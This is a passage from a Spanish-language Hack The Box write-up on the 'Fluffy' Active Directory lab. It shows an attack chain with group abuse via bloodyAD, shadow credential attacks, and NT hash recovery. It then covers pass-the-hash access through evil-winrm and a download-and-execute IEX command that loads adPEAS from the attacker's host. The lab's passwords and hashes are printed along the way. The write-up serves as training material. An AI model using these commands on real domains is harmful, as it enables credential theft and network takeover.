<h3 id="abusing-genericall---bloodyad">Abusing GenericAll - BloodyAD<a hidden class="anchor" aria-hidden="true" href="#abusing-genericall---bloodyad">#</a></h3>
<p>P.AGILA no tiene los permisos de SERVICE ACCOUNTS, así que necesitamos heredar los permisos. Para ello como p.agila tiene permisos genericALL sobre SERVICE ACCOUNTS, vamos a añadirlo al grupo mediante <code>bloodyAD</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exegol-default /workspace $ bloodyAD --host 10.10.11.69 -d fluffy.htb -u <span style="color:#e6db74">&#39;p.agila&#39;</span> -p <span style="color:#e6db74">&#39;prometheusx-303&#39;</span> add groupMember <span style="color:#e6db74">&#39;service accounts&#39;</span> <span style="color:#e6db74">&#39;p.agila&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> p.agila added to service accounts
</span></span></code></pre></div><p><img alt="Fluffy Machine 4" loading="lazy" src="/write-ups/active_directory/easy/fluffy/fotos/Fluffy_Machine_4.png"></p>
<p>Una vez p.agila es miembro del grupo SERVICE ACCOUNTS tenemos la posibilidad de realizar dos ataques.</p>
<ul>
<li>
<p>El ataque kerberoast para tratar de conseguir los hash kerberos y luego craquearlos para conseguir las credenciales</p>
</li>
<li>
<p>Realizar un shadow credential attack para autentificarse mediante la clave msDS-KeyCredentialLink.</p>
</li>
</ul>
<h3 id="user-ca_svc---abusing-genericwrite---shadow-credential-attack-pywhisker">User ca_svc - Abusing GenericWrite - Shadow credential attack (pywhisker)<a hidden class="anchor" aria-hidden="true" href="#user-ca_svc---abusing-genericwrite---shadow-credential-attack-pywhisker">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exegol-default /workspace $ pywhisker --dc-ip 10.10.11.69 -d <span style="color:#e6db74">&#34;fluffy.htb&#34;</span> -u <span style="color:#e6db74">&#34;p.agila&#34;</span> -p <span style="color:#e6db74">&#34;prometheusx-303&#34;</span> --target <span style="color:#e6db74">&#34;ca_svc&#34;</span> --action <span style="color:#e6db74">&#34;add&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> the target account
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target user found: CN<span style="color:#f92672">=</span>certificate authority service,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>fluffy,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating certificate
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate generated
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating KeyCredential
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KeyCredential generated with DeviceID: fb6f89f1-ff91-3711-b5d3-790d5a094c8f
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating the msDS-KeyCredentialLink attribute of ca_svc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Updated the msDS-KeyCredentialLink attribute of the target object
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Converting PEM -&gt; PFX with cryptography: CsFIjWrE.pfx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PFX exportiert nach: CsFIjWrE.pfx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Passwort für PFX: CfhhGhAY2Gh1CtKkmTU8
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Saved PFX <span style="color:#f92672">(</span><span style="color:#75715e">#PKCS12) certificate &amp; key at path: CsFIjWrE.pfx</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Must be used with password: CfhhGhAY2Gh1CtKkmTU8
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
</span></span></code></pre></div><p>Ahora vamos a obtener el tgt con PKINITtools:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exegol-default /workspace $ gettgtpkinit.py -cert-pfx CsFIjWrE.pfx -pfx-pass <span style="color:#e6db74">&#39;CfhhGhAY2Gh1CtKkmTU8&#39;</span> fluffy.htb/ca_svc ca_svc.ccache -dc-ip 10.10.11.69
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2025-05-30 06:11:53,102 minikerberos INFO Loading certificate and key from file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO:minikerberos:Loading certificate and key from file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2025-05-30 06:11:53,129 minikerberos INFO Requesting TGT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO:minikerberos:Requesting TGT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2025-05-30 06:11:54,465 minikerberos INFO AS-REP encryption key <span style="color:#f92672">(</span>you might need this later<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO:minikerberos:AS-REP encryption key <span style="color:#f92672">(</span>you might need this later<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2025-05-30 06:11:54,465 minikerberos INFO 84c4f40faf1acaab8111bed0a2a8852aa4a96902e86776a8b37bb06795379867
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO:minikerberos:84c4f40faf1acaab8111bed0a2a8852aa4a96902e86776a8b37bb06795379867
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2025-05-30 06:11:54,468 minikerberos INFO Saved TGT to file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO:minikerberos:Saved TGT to file
</span></span></code></pre></div><p>Una vez obtenido el tgt lo inyectamos y luego verificamos que el ticket sea válido.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>ca_svc.ccache
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exegol-default /workspace $ klist
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ticket cache: FILE:ca_svc.ccache
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Default principal: ca_svc@FLUFFY.HTB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Valid starting Expires Service principal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>05/30/2025 06:11:54 05/30/2025 16:11:54 krbtgt/FLUFFY.HTB@FLUFFY.HTB
</span></span></code></pre></div><p>Ahora con el script getnthash.py vamos a obtener el hash ntlm del usuario ca_svc.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>getnthash.py -key 84c4f40faf1acaab8111bed0a2a8852aa4a96902e86776a8b37bb06795379867 fluffy.htb/ca_svc -dc-ip 10.10.11.69
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using TGT from cache
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting ticket to self with PAC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Recovered NT Hash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ca0f4f9e9eb8a092addf53bb03fc98c8
</span></span></code></pre></div><p>Ahora con smb probamos que el hash NT sea válido.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exegol-default /workspace $ nxc ldap 10.10.11.69 -u <span style="color:#e6db74">&#34;ca_svc&#34;</span> -H <span style="color:#e6db74">&#34;ca0f4f9e9eb8a092addf53bb03fc98c8&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>LDAP 10.10.11.69 <span style="color:#ae81ff">389</span> DC01 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:fluffy.htb<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>LDAP 10.10.11.69 <span style="color:#ae81ff">389</span> DC01 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> fluffy.htb<span style="color:#ae81ff">\c</span>a_svc:ca0f4f9e9eb8a092addf53bb03fc98c8
</span></span></code></pre></div><h3 id="user-winrm_svc---abusing-genericwrite---shadow-credential-attack-pywhisker">User winrm_svc - Abusing GenericWrite - Shadow credential attack (pywhisker)<a hidden class="anchor" aria-hidden="true" href="#user-winrm_svc---abusing-genericwrite---shadow-credential-attack-pywhisker">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exegol-default /workspace $ pywhisker --dc-ip 10.10.11.69 -d <span style="color:#e6db74">&#34;fluffy.htb&#34;</span> -u <span style="color:#e6db74">&#34;p.agila&#34;</span> -p <span style="color:#e6db74">&#34;prometheusx-303&#34;</span> --target <span style="color:#e6db74">&#34;winrm_svc&#34;</span> --action <span style="color:#e6db74">&#34;add&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> the target account
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target user found: CN<span style="color:#f92672">=</span>winrm service,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>fluffy,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating certificate
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate generated
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating KeyCredential
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KeyCredential generated with DeviceID: 7988dafc-8fd6-ecfc-7fa0-4bf83136a640
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating the msDS-KeyCredentialLink attribute of winrm_svc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Updated the msDS-KeyCredentialLink attribute of the target object
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Converting PEM -&gt; PFX with cryptography: z6mHGuqe.pfx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PFX exportiert nach: z6mHGuqe.pfx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Passwort für PFX: 24QLGWORR84150cBBO3c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Saved PFX <span style="color:#f92672">(</span><span style="color:#75715e">#PKCS12) certificate &amp; key at path: z6mHGuqe.pfx</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Must be used with password: 24QLGWORR84150cBBO3c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exegol-default winrm $ gettgtpkinit.py -cert-pfx z6mHGuqe.pfx -pfx-pass <span style="color:#e6db74">&#39;24QLGWORR84150cBBO3c&#39;</span> fluffy.htb/winrm_svc winrm_svc.ccache -dc-ip 10.10.11.69
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2025-05-31 00:38:49,383 minikerberos INFO Loading certificate and key from file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO:minikerberos:Loading certificate and key from file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2025-05-31 00:38:49,416 minikerberos INFO Requesting TGT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO:minikerberos:Requesting TGT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2025-05-31 00:38:59,358 minikerberos INFO AS-REP encryption key <span style="color:#f92672">(</span>you might need this later<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO:minikerberos:AS-REP encryption key <span style="color:#f92672">(</span>you might need this later<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2025-05-31 00:38:59,358 minikerberos INFO 8578cc08aeb24e18cd60ad4b380a4bde6f85aa9f010de6a8f1509f16cd29b6e5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO:minikerberos:8578cc08aeb24e18cd60ad4b380a4bde6f85aa9f010de6a8f1509f16cd29b6e5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2025-05-31 00:38:59,361 minikerberos INFO Saved TGT to file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INFO:minikerberos:Saved TGT to file
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>May 31, <span style="color:#ae81ff">2025</span> - 00:39:50 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-default winrm $ export KRB5CCNAME<span style="color:#f92672">=</span>winrm_svc.ccache
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>May 31, <span style="color:#ae81ff">2025</span> - 00:40:24 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-default winrm $ ls
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>winrm_svc.ccache z6mHGuqe.pfx
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>May 31, <span style="color:#ae81ff">2025</span> - 00:40:25 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-default winrm $ klist
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ticket cache: FILE:winrm_svc.ccache
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Default principal: winrm_svc@FLUFFY.HTB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Valid starting Expires Service principal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>05/31/2025 00:38:59 05/31/2025 10:38:59 krbtgt/FLUFFY.HTB@FLUFFY.HTB
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exegol-default winrm $ getnthash.py -key 8578cc08aeb24e18cd60ad4b380a4bde6f85aa9f010de6a8f1509f16cd29b6e5 fluffy.htb/winrm_svc -dc-ip 10.10.11.69
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using TGT from cache
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting ticket to self with PAC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Recovered NT Hash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>33bd09dcd697600edf6b3a7af4875767
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 01, <span style="color:#ae81ff">2025</span> - 00:33:53 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-default /workspace <span style="color:#75715e"># export KRB5CCNAME=ldap_svc.ccache</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 01, <span style="color:#ae81ff">2025</span> - 00:34:26 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-default /workspace <span style="color:#75715e"># klist</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ticket cache: FILE:ldap_svc.ccache
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Default principal: ldap_svc@FLUFFY.HTB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Valid starting Expires Service principal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>06/01/2025 00:33:52 06/01/2025 10:33:52 krbtgt/FLUFFY.HTB@FLUFFY.HTB
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exegol-default /workspace <span style="color:#75715e"># getnthash.py -key f0d10a2a9fd24360549a96a20a3a1e5ebba3a0741e936905be210fbd619083fc fluffy.htb/ldap_svc -dc-ip 10.10.11.69</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using TGT from cache
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting ticket to self with PAC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Recovered NT Hash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>22151d74ba3de931a352cba1f9393a37
</span></span></code></pre></div><p>Una vez tenemos el hash NT vamos a intentar abrirnos una linea de comandos con <code>Evil-WinRM</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exegol-default winrm $ nxc winrm 10.10.11.69 -u <span style="color:#e6db74">&#34;winrm_svc&#34;</span> -H <span style="color:#e6db74">&#34;33bd09dcd697600edf6b3a7af4875767&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>WINRM 10.10.11.69 <span style="color:#ae81ff">5985</span> DC01 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:fluffy.htb<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>WINRM 10.10.11.69 <span style="color:#ae81ff">5985</span> DC01 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> fluffy.htb<span style="color:#ae81ff">\w</span>inrm_svc:33bd09dcd697600edf6b3a7af4875767 <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>WINRM 10.10.11.69 <span style="color:#ae81ff">5985</span> DC01 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> fluffy.htb<span style="color:#ae81ff">\w</span>inrm_svc:33bd09dcd697600edf6b3a7af4875767 zip<span style="color:#f92672">()</span> argument <span style="color:#ae81ff">2</span> is longer than argument <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>May 31, <span style="color:#ae81ff">2025</span> - 00:42:24 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-default winrm <span style="color:#75715e"># evil-winrm -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767 -i 10.10.11.69</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\w</span>inrm_svc<span style="color:#ae81ff">\D</span>ocuments&gt; type ..<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\u</span>ser.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>f324caee0***********************
</span></span></code></pre></div><h1 id="escalada-de-privilegios">Escalada de Privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
<h2 id="enumeración-del-dc-con-el-script-adpeas">Enumeración del DC con el script adPEAS<a hidden class="anchor" aria-hidden="true" href="#enumeración-del-dc-con-el-script-adpeas">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\w</span>inrm_svc<span style="color:#ae81ff">\D</span>esktop&gt; IEX<span style="color:#f92672">(</span>New-Object Net.WebClient<span style="color:#f92672">)</span>.downloadString<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://10.10.15.254/adPEAS.ps1&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\w</span>inrm_svc<span style="color:#ae81ff">\D</span>esktop&gt; Invoke-adPEAS
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_ _____ ______ _____
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>| | __ <span style="color:#ae81ff">\|</span> ____| /<span style="color:#ae81ff">\ </span>/ ____|
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>____ __| | |__<span style="color:#f92672">)</span> | |__ / <span style="color:#ae81ff">\ </span>| <span style="color:#f92672">(</span>___
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/ _ |/ _ | ___/| __| / /<span style="color:#ae81ff">\ \ \_</span>__ <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>
</span></span><span style="display:flex;"><span>| <span style="color:#f92672">(</span>_| | <span style="color:#f92672">(</span>_| | | | |____ / ____ <span style="color:#ae81ff">\ </span>____<span style="color:#f92672">)</span> |
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\_</span>_,_|<span style="color:#ae81ff">\_</span>_,_|_| |______/_/ <span style="color:#ae81ff">\_\_</span>____/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Version 0.8.27
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...SNIP...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> +++++ Checking Template <span style="color:#e6db74">&#39;WebServer&#39;</span> +++++
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Template <span style="color:#e6db74">&#39;WebServer&#39;</span> has Flag <span style="color:#e6db74">&#39;ENROLLEE_SUPPLIES_SUBJECT&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Template Name: WebServer
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Template distinguishedname: CN<span style="color:#f92672">=</span>WebServer,CN<span style="color:#f92672">=</span>Certificate Templates,CN<span style="color:#f92672">=</span>Public Key Services,CN<span style="color:#f92672">=</span>Services,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>fluffy,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Date of Creation: 04/17/2025 16:10:16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Extended Key Usage: Server Authentication
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EnrollmentFlag: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> CertificateNameFlag: ENROLLEE_SUPPLIES_SUBJECT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> +++++ Checking Template <span style="color:#e6db74">&#39;Machine&#39;</span> +++++
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Identity <span style="color:#e6db74">&#39;FLUFFY\Domain Computers&#39;</span> has enrollment rights <span style="color:#66d9ef">for</span> template <span style="color:#e6db74">&#39;Machine&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Template Name: Machine
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Template distinguishedname: CN<span style="color:#f92672">=</span>Machine,CN<span style="color:#f92672">=</span>Certificate Templates,CN<span style="color:#f92672">=</span>Public Key Services,CN<span style="color:#f92672">=</span>Services,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>fluffy,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Date of Creation: 04/17/2025 16:10:16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extended Key Usage: Client Authentication, Server Authentication
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EnrollmentFlag: AUTO_ENROLLMENT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CertificateNameFlag: SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enrollment allowed <span style="color:#66d9ef">for</span>: FLUFFY<span style="color:#ae81ff">\D</span>omain Computers
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> +++++ Checking Template <span style="color:#e6db74">&#39;User&#39;</span> +++++
</span></span><span style="display:flex;"><span>
